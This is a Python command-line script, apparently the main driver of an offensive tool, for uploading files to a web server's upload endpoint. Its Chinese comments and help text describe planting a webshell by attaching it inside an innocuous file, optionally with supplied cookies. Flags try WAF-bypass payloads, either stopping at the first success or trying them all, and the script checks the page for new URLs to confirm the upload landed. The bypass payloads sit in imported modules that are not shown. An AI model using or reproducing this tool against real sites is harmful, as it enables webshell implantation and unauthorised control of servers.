#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import requests
import argparse
import sys
from color_output import *
from bypass import General
from comman import Comman

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
}

class UPLOAD:
    def __init__(self, args):
        self.args = args
        self.cookies = self.getCookie()
        self.data = self.setData(self.args.data)  # 填充参数
        self.Comman = Comman(self.args.u)
        self.initUrls = self.Comman.extractUrls(self.getInitText(self.args.u))  # 未上传前的初始URL集

    def run(self):
        # 占坑，未完成
        if self.args.bypass or self.args.bypass_ignore:  # 畸形请求
            self.deformityUpload()
        else:    # 正常上传
            self.normalUpload()

    def normalUpload(self):
        # 正常上传
        print(fuchsia('[ module ]') + cyan('普通上传'))
        files = self.setNormalFiles(self.args.field, self.args.f)  # 读取文件
        res = self.Comman.upload(self.args.u, files, data=self.data)   # 文件上传
        result = self.Comman.checkResult(self.initUrls, res)
        if result == True:
            print(green('[ result ]') + cyan('成功上传'))
        return

    def deformityUpload(self):
        # 非正常上传
        if self.args.attach != '':  # 存在attach合并文件，获取后缀名备用
            suffix = self.getSuffix(self.args.attach)
        stop = True
        if self.args.bypass:
            print(fuchsia('[ module ]') + cyan('bypass，成功即停'))
        elif self.args.bypass_ignore:
            print(fuchsia('[ module ]') + cyan('bypass，全部尝试'))
            stop = False
        m = General(self.args, data=self.data, initUrls=self.initUrls, comman=self.Comman, stop=stop)
        m.exploit()
        return

    def getSuffix(self, filename):
        # 获取文件名后缀
        try:
            ext = filename.split('.')[-1]
            return ext
        except:
            if self.args.ct != '':
                return
            print(red('[ Error ]') + yellow('获取文件后缀名失败'))
            sys.exit()

    def setData(self, data):
        # 解析data
        if data == '':
            return {}
        else:
            retData = {}
            for x in data.split(';'):
                v,k =  x.strip().split('=', 1)
                retData[v] = k
            return retData


    def setNormalFiles(self, field, file):
        # 获取文件内容，普通上传专属
        try:
            files = {
                field: (
                file,
                open(file, 'rb'),
            )
            }
            # print(files)
            return files
        except:
            print(red('[ Error ]') + yellow('读取文件失败'))
            sys.exit()

    def getInitText(self, url):
        # 获取上传文件前页面
        try:
            r = requests.get(url, headers=headers, timeout=5, cookies=self.cookies)
            return r.text
        except Exception as e:
            print(red('[ Error ]') + e)
            sys.exit()

    def getCookie(self):
        # 解析document.cookie
        cookie = self.args.c
        if cookie == None:
            return None
        cookies = {}  # 初始化cookies字典变量
        try:
            for x in cookie.split(';'):  # 按照字符：进行划分读取
                name, value = x.strip().split('=', 1)
                cookies[name] = value  # 为字典cookies添加内容
        except:
            print(red('[ Error ]') + yellow('cookie格式错误'))
            sys.exit()
        return cookies

    def showMessage(self):
        # 展示选项参数
        print(blue('[ schedule ]') + cyan('参数展示'))
        print(green('[ Info ]') + fuchsia('上传路径:') + self.args.u)
        print(green('[ Info ]') + fuchsia('上传文件:') + cyan(self.args.f))
        if self.args.attach:
            print(green('[ Info ]') + fuchsia('伪造文件:') + cyan(self.args.attach))
        print(green('[ Info ]') + fuchsia('参数名称:') + cyan(self.args.field))
        if self.args.c:
            print(green('[ Info ]') + fuchsia('cookie信息:') + cyan('已填写'))
        if self.args.data:
            print(green('[ Info ]') + fuchsia('附加参数:') + cyan('已填写'))
        print()
        return


def terminal_parser():
    if len(sys.argv)==1 :
        sys.argv.append('-h')
    parser = argparse.ArgumentParser(description='动态文件上传', add_help=True)
    parser.add_argument('-u', help='文件接收URL路径')
    parser.add_argument('-c', help='document.cookie，选填', default=None)
    parser.add_argument('-f', help='上传文件')
    parser.add_argument('--field', help='上传参数名')
    parser.add_argument('--data', help='附加参数，如submit=true，多参数用;分割', default='')
    parser.add_argument('--attach', help='webshell文件，附加时将尝试附加在正常文件内', default='')
    parser.add_argument('--bypass', help='尝试绕过WAF，成功即停', action='store_true')
    parser.add_argument('--bypass_ignore', help='尝试绕过WAF，尝试全部payload', action='store_true')
    parser.add_argument('--ct', help='文件上传类型', default='', choices=['png', 'jpeg', 'gif', 'json', 'plain'])
    parser.add_argument('--mime', help='自定义content-type', default='')
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = terminal_parser()
    x = UPLOAD(args)
    x.showMessage()
    x.run()